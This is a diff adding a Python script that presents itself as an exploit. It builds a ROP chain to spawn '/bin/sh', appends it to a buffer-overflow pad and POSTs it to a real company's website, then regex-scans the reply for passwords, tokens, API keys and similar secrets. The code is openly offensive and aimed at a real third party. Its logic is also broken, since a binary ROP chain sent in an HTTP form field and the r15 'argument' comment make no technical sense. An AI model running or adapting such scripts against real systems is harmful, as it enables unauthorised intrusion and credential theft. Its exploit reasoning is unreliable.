@@ -1,0 +1,85 @@
+import struct
+import requests
+import re
+
+# Example gadgets found from a hypothetical vulnerable binary
+pop_rdi = 0x40100d  # Address of the gadget `pop rdi; ret`
+pop_rsi_r15 = 0x40100f  # Address of the gadget `pop rsi; pop r15; ret`
+syscall = 0x400fe5  # Address of the syscall gadget
+bin_sh = 0x600010  # Address of the string "/bin/sh" in the binary
+
+# Build a ROP chain that spawns a shell
+rop_chain = [
+    pop_rdi,     # Gadget to set the first argument (rdi)
+    bin_sh,      # Address of "/bin/sh"
+    pop_rsi_r15, # Gadget to set second and third arguments (rsi and r15)
+    0x0,         # Null pointer (for the second argument)
+    0x0,         # Null pointer (for the third argument, r15)
+    syscall      # Trigger the syscall for execve("/bin/sh", NULL, NULL)
+]
+
+# Pack the ROP chain to send it over the network
+payload = b"A" * 512  # Overflow buffer (adjust size as needed)
+payload += b"".join([struct.pack("<Q", gadget) for gadget in rop_chain])
+
+# List of URLs to test the exploit
+target_urls = [
+    "https://apple.com",
+]
+
+# Updated sensitive keywords for juicy information
+sensitive_keywords = [
+    "password", "user", "admin", "db", "credentials", "api_key", 
+    "token", "root", "mysql", "shadow", "config", "secret"
+]
+
+def extract_sensitive_data(response_text):
+    """
+    Function to extract sensitive information from the server's response
+    using predefined sensitive keywords.
+    """
+    sensitive_data = []
+    
+    for keyword in sensitive_keywords:
+        # Dynamically compile the regex pattern for each keyword
+        pattern = re.compile(rf'({keyword}\s*[:=]\s*[^\s]+)', re.IGNORECASE)
+        matches = pattern.findall(response_text)
+        
+        if matches:
+            sensitive_data.extend(matches)
+    
+    return sensitive_data
+
+def perform_exploit(url):
+    """
+    Function to send the payload to the target URL and process the response
+    for sensitive data.
+    """
+    print(f"Testing {url} for vulnerability...")
+    
+    try:
+        # Send the payload to the target
+        response = requests.post(url, data={"exploit": payload})
+
+        if response.status_code == 200:
+            # Extract sensitive data from the response
+            sensitive_data = extract_sensitive_data(response.text)
+
+            if sensitive_data:
+                print("-------------------------------------------------------")
+                print("Sensitive data found!")
+                print("-------------------------------------------------------")
+                for item in sensitive_data:
+                    print(item)
+                print("-------------------------------------------------------")
+            else:
+                print(f"No sensitive data found on {url}.")
+        else:
+            print(f"Failed to send payload to {url} (Status Code: {response.status_code})")
+
+    except requests.exceptions.RequestException as e:
+        print(f"Error connecting to {url}: {e}")
+
+# Run the exploit for each target URL
+for url in target_urls:
+    perform_exploit(url)
